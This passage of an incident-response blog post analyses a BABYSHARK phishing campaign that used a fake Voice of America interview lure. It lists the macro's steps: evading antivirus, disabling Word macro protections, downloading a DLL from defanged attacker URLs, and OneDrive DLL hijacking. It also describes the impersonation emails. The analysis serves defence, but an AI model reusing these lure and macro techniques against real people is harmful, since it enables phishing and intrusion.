countries and continents all over the world.</p><p>Attempting to retrieve the <span class="highlight">VOA_Korea.zip </span>file, it was unfortunately no longer present on each of the compromised machines. </p><p>AV logs revealed that the end user attempted to download this file two times.</p><h2>Finding the Phish</h2><p>There was still a <span class="highlight">VOA_Korea (1).zip</span> that was present and we were able to retrieve the file. Uncompressing the archive, we hit another wall—the <span class="highlight">.doc</span> file was password protected. This doubles as both a sneaky phishing tactic, but also to potentially hide malicious macros from antivirus software.</p><p>It was at this point that we went from <em>hunting</em> to <em>hacking </em>and started trying to crack open the file. We do say <em>our offense is your defense</em>, after all! 😉</p><p>After throwing combinations of John The Ripper and Hashcat with different wordlists and rule files, eventually, a boring, basic bruteforce found the password: <span class="highlight">voa2021</span>.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:869px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="869px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe42d7b7083f741da87c13232435f07e7"/></picture></div></figure><p>With a rush of adrenaline, we went to examine the decrypted Microsoft Word document, opting for the one of quickest tools for macro analysis, <strong>olevba</strong>. </p><p>The .doc file lit up like a Christmas tree.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:714px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="714px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F37d54bf53eff4d7a93a1a5b4a5be69fd"/></picture></div></figure><p>We found the malicious macro document used for initial access! After <a href="https://gist.github.com/JohnHammond/070af94c211536109642feff1fbc950e" target="_blank">some quick deobfuscating</a> (same technique as seen previously), we could see the whole picture for this attack.</p><p>This macro tells the story for almost each of the puzzle pieces we had uncovered previously.</p><ul><li>Checks for the presence of OneDrive</li><li>Downloads a new Microsoft Word document to show the user and convince them of the phish: (<span class="highlight">http[:]//beastmodser.club/sil/0304/VOA_Korea[.]docx</span>)</li><li>Checks for the presence of antivirus products like BitDefender or Norton Security, and quits if present</li><li>Disables Microsoft Word macro protections in registry</li><li>Downloads a <span class="highlight">version.tmp</span> file to be then moved and renamed as version.dll for the OneDrive DLL hijacking attack (<span class="highlight">https[:]//beastmodser.club/sil/0304/d[.]php?na=version.gif</span>)</li><li>Starts <span class="highlight">OneDriveStandaloneUpdater.exe</span> to begin the DLL hijacking attack</li></ul><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1200px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1200px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F22f5bbc28d58425b835947fc5d9704e7"/></picture></div></figure><p>Checking for the presence of antivirus or security software is a common technique for sophisticated malware samples, but this adds to the stealth of the operation. The malicious macro bailing out and not detonating if there are certain products present makes this even more targeted.</p><p>While this explained the <span class="highlight">version.dll</span>, unfortunately, we were unable to retrieve the original file from the malicious hosting URL. Neither the faked <span class="highlight">VOA_Korea.docx</span> file or the DLL were still present on the newfound <span class="highlight">beastmodser[.]club</span> domain… but it is at least known evil. 😉</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:844px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="844px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1753ae2331cf4690b456a70f4be0f69d"/></picture></div></figure><p>Other reports on BABYSHARK malware have explained how it does disable macro warnings and Microsoft Office security protections. This was very evident in the code run by the macro…changing registry values to disable defense across practically every version of Microsoft Word. </p><p>A quick synopsis of the commands ran within that macro: </p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1200px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1200px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2Fe4d7ba9c65404bfcadaaae176176b7fc"/></picture></div></figure><h2>Lures and Phishbait</h2><p>With the discovery of the initial attack vector and phishing document, and after analysis of the pertinent files to determine the scope of this attack, we felt this investigation was coming to a close. But even after finding the malicious macro, we were still curious—what convinced Alex to open this file?</p><p>The “lure” looked safe and secure, tucked away inside of a ZIP file with a password-protected document… what was the pretense?</p><p>We asked the trialing partner if they could find the original email. Here we showcase a fascinating back-and-forth with some cunning deception and a well-played scheme.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1200px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1200px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F01348c315b3843c389f07327cb0977c3"/></picture></div></figure><p>The threat actor reaches out to Alex under the guise of collecting info for the VOA, masquerading as a real VOA author (that author link is legitimate, along with the Twitter profile). There is no attachment—they <em>ask</em> for input from the victim.</p><p>Alex falls for the bait, but there is at least one clue that suggests this may have originated from an illegitimate source:</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1041px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1041px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F1244c66f67d243acb51a37afff5449a3"/></picture></div></figure><p>Voice of America probably doesn’t use Yahoo as their email provider. 🥴</p><p>Alex has no cause for concern here—they sent <em>them</em> a document with answers to their questions. For the final trick, our threat actor suggests they have “made some edits” and are sending the last copy back for final approval. To “be secure,” the document is password protected. 😈</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1112px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1112px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?format=webp&amp;width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7" type="image/webp"/><img role="presentation" loading="lazy" fetchPriority="auto" class="builder-image image-zoomable css-2qdlcf" src="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7" srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7?width=2000 2000w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F2dc9b9dee8814118b007ca5a2795fcb7"/></picture></div></figure><p>There is the smoking gun—a OneDrive link with the hosted download for our <span class="highlight">VOA_Korea.zip</span> file, with the password-protected Word document with the macro that kickstarts this compromise. </p><p>Thinking back to the malicious VBScript, wasn’t the target <em>Bob</em>, and not Alex? The threat actor may have used a roundabout method to get the true victim… but it worked. </p><p>Alex forwarded the email to their co-workers for their approval and carbon-copied the other victims.</p><figure class="w-richtext-figure-type-image w-richtext-align-fullwidth" style="max-width:1030px" data-rt-type="image" data-rt-align="fullwidth" data-rt-max-width="1030px"><div><picture><source srcSet="https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=100 100w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=200 200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=400 400w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=800 800w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=1200 1200w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=1600 1600w, https://cdn.builder.io/api/v1/image/assets%2F3eb6f92aedf74f109c7b4b0897ec39a8%2F8a2246be7831426084cf0fa586fd4981?format=webp&amp;width=2000 2000w, 